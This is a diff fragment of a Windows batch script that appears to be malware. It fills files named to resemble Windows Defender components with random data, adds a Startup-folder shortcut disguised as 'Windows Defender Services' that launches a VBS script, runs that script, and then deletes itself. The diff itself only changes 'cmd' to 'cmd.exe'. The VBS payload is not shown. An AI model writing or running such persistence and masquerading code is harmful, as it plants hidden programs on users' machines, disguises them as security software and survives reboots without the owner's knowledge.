@@ -21,5 +21,5 @@ echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDe
 echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesUpdates.dll"
 echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesBackground.dll"
 mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender Services.lnk" "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs" >nul 2>&1
-cmd /c "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
+cmd.exe /c "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
 del %0 & exit
